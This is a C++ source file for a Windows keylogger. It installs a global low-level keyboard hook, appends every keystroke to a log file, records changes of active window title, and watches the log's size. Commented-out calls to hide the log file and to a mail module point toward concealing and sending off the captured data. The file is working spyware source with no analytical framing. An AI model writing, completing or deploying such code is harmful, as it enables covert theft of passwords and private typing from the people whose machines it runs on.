// KeyLogger.cpp : 이 파일에는 'main' 함수가 포함됩니다. 거기서 프로그램 실행이 시작되고 종료됩니다.

#define _CRT_SECURE_NO_WARNINGS
#include "stdafx.h"
#include "filemanager.h"
// #include "mailmanager.h"
#include "winmanager.h"
#include "KeyLogger.h"
using namespace std;

FILE* f;
HHOOK hKeyboardHook;
static int keysPressed = 0;

DWORD WINAPI Keylogger(LPVOID lpParm)
{
    HINSTANCE hins;
    hins = GetModuleHandle(NULL);
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)Hook, hins, 0);

    MSG message;
    while (GetMessage(&message, NULL, 0, 0))
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    UnhookWindowsHookEx(hKeyboardHook);
    return 0;
}

LRESULT WINAPI Hook(int nCode, WPARAM wParam, LPARAM lParam)
{
	char* workFullPath;


	if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
	{
		workFullPath = getlogfilepath(getlogfilename());
		if (workFullPath)
		{
			f = fopen(workFullPath, "a+");
			//DWORD aa = GetLastError();
		}
		KBDLLHOOKSTRUCT hooked_key = *((KBDLLHOOKSTRUCT*)lParam);
		DWORD dwMsg = 1;
		dwMsg += hooked_key.scanCode << 16;
		dwMsg += hooked_key.flags << 24;
		wchar_t lpszKeyName[1024] = { 0 };
		lpszKeyName[0] = '[';

		int i = GetKeyNameText(dwMsg, (lpszKeyName + 1), 0xFF) + 1;
		int key = hooked_key.vkCode;
		lpszKeyName[i] = ']';
		if (key >= 'A' && key <= 'Z')
		{
			if (GetAsyncKeyState(VK_SHIFT) >= 0)
				key += 0x20;
			if (f != NULL)
				fprintf(f, "%c", key);
		}
		else
		{
			if (f != NULL)
				fprintf(f, "%s", ConvertWCtoC(lpszKeyName));
		}
		keysPressed++;
		//hide_file(workFullPath);
		fclose(f);
	}
	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

void on_press(string key) {
    logger(key);
    printf("%s", key);
}

void wintitle() {
    string oldtitle = gettitle();
    while (TRUE) {
        Sleep(100);
        if (gettitle() != oldtitle) {
            logger("\n" + gettitle() + "\n");
        }
        oldtitle = gettitle();
    }
}

void FSD() {
    int MAX_SIZE = 20000;
    while (TRUE) {
        Sleep(1000);
        if (getfilesize() > MAX_SIZE) {
            printf("File size over!\n");
        }
    }
}